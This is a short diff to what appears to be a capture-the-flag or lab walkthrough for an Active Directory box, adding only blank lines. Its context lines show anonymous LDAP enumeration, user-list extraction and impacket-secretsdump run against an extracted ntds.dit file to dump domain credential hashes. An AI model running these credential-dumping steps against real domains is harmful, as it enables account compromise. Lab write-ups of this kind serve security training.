@@ -211,6 +211,7 @@ ldapsearch -x -b "dc=baby,dc=vl" -H ldap://10.10.65.1
 ```
 
 - Output
+
 ```
 # extended LDIF
 #
@@ -1022,6 +1023,7 @@ cat ldap|grep dn:| awk -F 'CN=' '{print $2}'|awk -F ',' '{print $1}' >users.txt
 
 Note that from samaccount we got that users do have format of firstname.lastname
 - Output
+  
 ```
 dev
 Jacqueline.Barnett
@@ -1167,6 +1169,7 @@ impacket-secretsdump -system system -ntds ntds.dit LOCAL
 ```
 
 - Output
+
 ```
 └─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
